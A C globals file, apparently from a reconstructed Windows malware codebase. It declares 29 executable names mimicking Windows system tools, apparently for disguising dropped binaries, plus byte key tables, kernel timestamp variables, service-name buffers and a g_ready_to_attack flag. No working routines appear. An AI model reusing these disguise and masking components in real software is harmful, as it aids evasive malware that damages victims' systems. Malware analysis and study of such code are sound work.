/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "Global.h"

/** -------------->> Segment ".data" <<-------------- **/
WCHAR g_random_exec_name[29][15] = 
{
	L"caclsrv",
	L"certutl",
	L"clean",
	L"ctrl",
	L"dfrag",
	L"dnslookup",
	L"dvdquery",
	L"event",
	L"findfile",
	L"gpget",
	L"ipsecure",
	L"iissrv",
	L"msinit",
	L"ntfrsutil",
	L"ntdsutl",
	L"power",
	L"rdsadmin",
	L"regsys",
	L"sigver",
	L"routeman",
	L"rrasrv",
	L"sacses",
	L"sfmsc",
	L"smbinit",
	L"wcscript",
	L"ntnw",
	L"netx",
	L"fsutl",
	L"extract"
};

char g_keys[4][4] =
{
	{0x25, 0x7F, 0x5D, 0xFB},
	{0x17, 0xD4, 0xBA, 0x00},
	{0x5C, 0xC2, 0x1A, 0xBB}
};

WCHAR g_test50[6][50] =
{
	L"test123",
	L"test456",
	L"test789",
	L"testdomain.com",
	L"456",
	L"789"
};

WCHAR g_test100[3][100] =
{
	L"123123",
	L"456456",
	L"789789"
};

FILETIME g_kernel_creation_time   = {};
FILETIME g_kernel_last_write_time = {};

WCHAR g_windows_directory[40] = {};

/** ----->> Undeclared <<----- **/
WCHAR g_unk_pool[30];
WCHAR g_module_path[MAX_PATH];
FILETIME g_kernel_last_access_time;
WCHAR **g_argv;
INT32 g_argc;
RTL_CRITICAL_SECTION g_critical_section;
bool g_ready_to_attack;
DWORD g_svc_id;
WCHAR g_svc_name[50];
DWORD g_netinit_id;
WCHAR g_netinit_name[50];